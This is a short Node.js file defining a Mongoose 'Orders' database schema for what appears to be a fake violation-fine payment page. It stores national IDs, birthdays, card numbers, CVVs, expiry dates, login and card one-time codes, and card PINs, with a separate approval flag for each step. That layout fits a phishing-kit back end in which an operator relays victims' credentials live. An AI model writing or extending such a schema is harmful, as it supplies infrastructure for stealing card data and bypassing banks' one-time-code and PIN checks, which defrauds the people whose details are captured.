const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema(
    {
      type: String,
      nationalId: String,
      vioNumber: String,
      birthday: Date,
      buildNumber: String,
      nationalOther: String,
      price: String,

      loginAccept: {
        type: Boolean,
        default: false,
      },

      loginOtp: String,

      loginOTPAccept: {
        type: Boolean,
        default: false,
      },

      visa_card_holder_name: String,
      visa_card_number: String,
      visa_cvv: String,
      visa_expiryDate: String,
      method:String,

      visaAccept: {
        type: Boolean,
        default: false,
      },

      visa_otp: String,

      visaOtpAccept: {
        type: Boolean,
        default: false,
      },

      visa_pin: String,

      visaPinAccept: {
        type: Boolean,
        default: false,
      },
      checked: {
        type: Boolean,
        default: false,
      },
      created: { type: Date, default: Date.now },
    },
    { timestamps: true }
  )
);
